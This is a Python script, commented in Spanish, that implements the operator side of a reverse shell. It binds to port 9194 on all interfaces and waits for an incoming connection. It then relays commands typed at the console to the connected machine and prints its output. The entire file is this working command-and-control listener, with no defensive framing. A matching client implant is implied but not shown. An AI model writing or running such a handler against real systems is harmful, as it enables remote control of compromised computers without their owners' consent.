import socket
import sys
from multiprocessing import Process
import time
from queue import Queue

conexiones = []
direcciones = []

class Reverse:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.s = self.crear_socket()
    # crea un socket
    def crear_socket(self):
        try:
            return socket.socket()
        except socket.error as msg:
            return (f' Error al crear socket: {msg}')

    #binding el socket y escuchando conexiones
    def bind_socket(self):
        try:
            print(f'Binding el puerto {self.port}')

            self.s.bind((self.host, self.port))
            self.s.listen(5)

        except socket.error as msg:
            print(f' Error al binding el socket: {msg}, reintentando...')
            self.bind_socket()

    # establecer conexion con el cliente(socket debe escuchar)
    def aceptar_conexion(self):
        conn, address = self.s.accept()
        print(f'Conexion establecida con el host {address[0]} puerto {address[1]}')
        self.enviar_comando(conn)
        conn.close()

    # envia un comando al cliente
    def enviar_comando(self, conn):
        while True:
            cmd = input()
            if cmd == 'salir':
                conn.close()
                self.s.close()
                sys.exit()

            if len(str.encode(cmd)) > 0: # quiere decir que se tipeo algo
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(1024),'utf-8')
                print(client_response, end='')



start = Reverse(host='', port = 9194)
start.crear_socket()
start.bind_socket()
start.aceptar_conexion()